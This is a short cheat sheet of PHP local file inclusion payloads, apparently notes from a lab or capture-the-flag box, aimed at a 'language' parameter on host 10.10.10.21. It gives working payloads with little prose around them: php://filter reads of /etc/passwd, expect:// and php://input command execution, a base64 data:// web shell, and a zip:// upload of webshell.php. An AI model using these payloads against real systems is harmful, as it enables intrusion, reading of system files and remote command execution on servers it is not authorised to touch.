## Base64

```python
php://filter/read=convert.base64-encode/resource=

http://10.10.10.21/index.php?language=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

## Rot13

```python
php://filter/read=string.rot13/resource=

http://10.10.10.21/index.php?language=php://filter/read=string.rot13/resource=/etc/passwd
```

## Expect Wrapper

```python
expect://id

http://10.10.10.21/index.php?language=expect://id
```

## Data Wrapper

```python
echo '<?php system($_GET['cmd']); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=

data://text/plain;base64,

http://10.10.10.21/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id
```

## Input Wrapper

```python
php://input

curl -s -X POST --data "<?php system('id'); ?>" "http://10.10.10.21/index.php?language=php://input"
```

## Zip Wrapper

```python
echo '<?php system($_GET['cmd']); ?>' > webshell.php
zip webshell.zip webshell.php

http://10.10.10.21/index.php?language=zip://webshell.zip%23webshell.php&cmd=id
```
